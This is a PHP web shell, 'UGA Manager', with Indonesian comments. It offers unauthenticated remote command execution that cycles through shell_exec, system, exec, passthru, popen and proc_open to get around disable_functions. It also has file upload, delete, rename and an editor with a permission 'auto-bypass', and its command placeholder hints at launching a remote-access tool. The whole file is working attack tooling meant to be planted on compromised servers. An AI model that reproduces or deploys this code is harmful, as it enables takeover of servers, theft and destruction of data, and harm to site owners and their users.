<?php
session_start();
$U="SUGA";
$d=isset($_GET['d'])?realpath($_GET['d']):getcwd();if(!$d)$d=getcwd();

// Fungsi Recursive Delete
function r($p){if(!is_dir($p))return 0;foreach(array_diff(scandir($p),array('.','..'))as$f){$x="$p/$f";is_dir($x)?r($x):unlink($x);}return rmdir($p);}

// Fungsi Terminal Bypass
function x($c){
    if(!$c)return "";
    $df=ini_get('disable_functions');
    if(function_exists('shell_exec')&&!preg_match("/shell_exec/i",$df))return @shell_exec($c);
    if(function_exists('system')&&!preg_match("/system/i",$df)){ob_start();@system($c);return ob_get_clean();}
    if(function_exists('exec')&&!preg_match("/exec/i",$df)){@exec($c,$o);return implode("\n",$o);}
    if(function_exists('passthru')&&!preg_match("/passthru/i",$df)){ob_start();@passthru($c);return ob_get_clean();}
    if(function_exists('popen')&&!preg_match("/popen/i",$df)){$h=@popen($c,'r');$r=@stream_get_contents($h);@pclose($h);return $r;}
    if(function_exists('proc_open')&&!preg_match("/proc_open/i",$df)){$p=@proc_open($c,array(1=>array("pipe","w")),$pipes);if(is_resource($p)){$r=@stream_get_contents($pipes[1]);@fclose($pipes[1]);@proc_close($p);return $r;}}
    return "[!] Semua exec diblokir.\nDisable Functions: ".$df;
}

// HANDLER AJAX TERMINAL
if(isset($_GET['ajax_cmd'])){
    $current_dir = isset($_SESSION['term_cwd']) ? $_SESSION['term_cwd'] : getcwd();
    if (preg_match('/^cd\s+(.+)$/', trim($_GET['ajax_cmd']), $matches)) {
        $target = trim($matches[1]);
        if (strpos($target, '/') !== 0) { $target = $current_dir . '/' . $target; }
        $real = realpath($target);
        if ($real && is_dir($real)) { $_SESSION['term_cwd'] = $real; echo "Pindah ke: " . $real; } 
        else { echo "Gagal pindah ke: " . $target; }
    } else {
        $full_cmd = "cd " . escapeshellarg($current_dir) . " && " . $_GET['ajax_cmd'];
        echo htmlspecialchars(x($full_cmd));
    }
    exit;
}

// HANDLER AJAX SAVE (AUTO BYPASS)
if(isset($_POST['ajax_save'])){
    $target_file = $d . '/' . $_POST['file'];
    $content = $_POST['content'];
    
    if (!file_exists($target_file)) {
        echo "0|File tidak ditemukan.";
        exit;
    }

    // TRIK 1: Coba chmod 777 dulu
    if (!is_writable($target_file)) {
        @chmod($target_file, 0777);
    }

    // Coba simpan
    $res = @file_put_contents($target_file, $content);
    
    // TRIK 2: Kalau masih gagal, coba hapus file lama, bikin baru dengan nama sama
    if ($res === false) {
        $temp_name = $target_file . ".tmp";
        if (@file_put_contents($temp_name, $content) !== false) {
            @rename($temp_name, $target_file);
            $res = true; // Anggap sukses
        }
    }

    if ($res !== false) {
        echo "1|File berhasil disimpan! (Auto-bypass applied)";
    } else {
        echo "0|Gagal total. Server nolak nulis. File mungkin milik root atau system.";
    }
    exit;
}

// HANDLER LAINNYA
if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],"$d/".basename($_FILES['f']['name']));@chmod("$d/".basename($_FILES['f']['name']),0755);header("Location: ?d=".urlencode($d));exit;}
if(isset($_GET['del'])){is_dir("$d/".$_GET['del'])?r("$d/".$_GET['del']):unlink("$d/".$_GET['del']);header("Location: ?d=".urlencode($d));exit;}
if(isset($_GET['rn'])&&isset($_GET['to'])){rename("$d/".$_GET['rn'],"$d/".$_GET['to']);header("Location: ?d=".urlencode($d));exit;}
if(isset($_POST['m'])){if($_POST['t']=='f')file_put_contents("$d/".$_POST['n'],"");else mkdir("$d/".$_POST['n'],0755);header("Location: ?d=".urlencode($d));exit;}

// HANDLER EDIT
if(isset($_GET['e'])){
    $fname = htmlspecialchars($_GET['e']);
    $fcontent = htmlspecialchars(@file_get_contents("$d/".$_GET['e']));
    echo "<!DOCTYPE html><html><head><title>Edit - $fname</title><style>body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}textarea{width:100%;height:75vh;background:#111;color:#0f0;border:1px solid #333;padding:10px;font-size:14px;}button{background:#0f0;color:#000;font-weight:bold;padding:10px 20px;border:none;cursor:pointer;margin-top:10px;}a{color:#f00;margin-left:20px;}</style></head><body>";
    echo "<h3>Editing: $fname</h3>";
    echo "<textarea id='content'>$fcontent</textarea><br>";
    echo "<button onclick=\"saveFile('$fname')\">SAVE FILE</button> <a href='?d=".urlencode($d)."'>[CANCEL]</a>";
    echo "<script>
        function saveFile(fname){
            var c = document.getElementById('content').value;
            var fd = new FormData();
            fd.append('ajax_save', '1');
            fd.append('file', fname);
            fd.append('content', c);
            fetch('', {method:'POST', body: fd})
            .then(r => r.text())
            .then(d => {
                var parts = d.split('|');
                if(parts[0] === '1') { alert(parts[1]); location.href='?d=".urlencode($d)."'; }
                else { alert('GAGAL: ' + parts[1]); }
            });
        }
    </script></body></html>";
    exit;
}
?>
<html><head><style>
body{background:#0a0a0a;color:#0f0;font-family:monospace;font-size:13px;}
a{color:#0ff;text-decoration:none;} a:hover{color:#fff;}
table{width:100%;border-collapse:collapse;margin-top:10px;}
th,td{border:1px solid #222;padding:6px;text-align:left;} th{background:#111;color:#fff;}
.r{color:#ffbb00;} .del{color:#f00;} .rn{color:#0f0;cursor:pointer;}
input[type=submit]{background:#0f0;color:#000;font-weight:bold;border:none;padding:3px 8px;cursor:pointer;}
.cmdbox{width:100%;background:#111;color:#0f0;border:1px solid #333;padding:5px;margin-top:5px;font-family:monospace;}
pre{background:#000;border:1px solid #333;padding:10px;color:#0f0;white-space:pre-wrap;max-height:300px;overflow:auto;}
</style></head><body>
<h3>UGA Manager | <?=$U?></h3>
<b>Path:</b> <?=$d?><br><br>
<a href="?d=/">[ROOT]</a> | <a href="?d=<?=dirname($d)?>">[.. PARENT]</a>
<br><br>

<div style="margin-bottom:15px;">
    <b>Terminal (Exec):</b><br>
    <input type=text id=cmdinput class=cmdbox placeholder="id; cd /tmp; ls -la; ./gs -s 'xxx' -l">
    <input type=button value=RUN onclick="runCmd()" style="background:#0f0;color:#000;font-weight:bold;border:none;padding:6px 10px;cursor:pointer;">
    <pre id=output style="display:none;"></pre>
</div>

<script>
function runCmd() {
    var cmd = document.getElementById('cmdinput').value;
    var out = document.getElementById('output');
    if(!cmd) return;
    out.style.display = 'block';
    out.innerHTML = 'Loading...';
    fetch('?ajax_cmd=' + encodeURIComponent(cmd))
        .then(r => r.text())
        .then(data => { out.innerHTML = data; })
        .catch(e => { out.innerHTML = 'Error: ' + e; });
}
document.getElementById('cmdinput').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') { e.preventDefault(); runCmd(); }
});
</script>

<form method=POST enctype=multipart/form-data><input type=file name=f><input type=submit value=UPLOAD></form>
<form method=POST><input type=hidden name=m value=1>Nama:<input type=text name=n><select name=t><option value=f>File<option value=d>Folder</select><input type=submit value=CREATE></form>
<table><tr><th>Nama File / Folder</th><th>Ukuran</th><th>Aksi</th></tr>
<?php
if(dirname($d)!=$d)echo"<tr><td><a href='?d=".dirname($d)."'>[..] PARENT</a></td><td>-</td><td>-</td></tr>";
foreach(@scandir($d)as$f){if($f=='.'||$f=='..')continue;$p="$d/$f";$i=is_dir($p);
echo"<tr><td>".($i?"<a href='?d=$p'><b>[DIR] $f</b></a>":"$f")."</td><td>".($i?'-':number_format(filesize($p)).' B')."</td><td>";
if(!$i)echo"<a class=r href='?d=".urlencode($d)."&e=".urlencode($f)."'>[Edit]</a> ";
echo"<span class=rn onclick=\"var n=prompt('Rename:','$f');if(n&&n!='$f')location='?d=".urlencode($d)."&rn=$f&to='+n;\">[Rename]</span> ";
echo"<a class=del href='?d=".urlencode($d)."&del=".urlencode($f)."' onclick=\"return confirm('Hapus?')\">[Del]</a>";
echo"</td></tr>";}
?>
</table></body></html>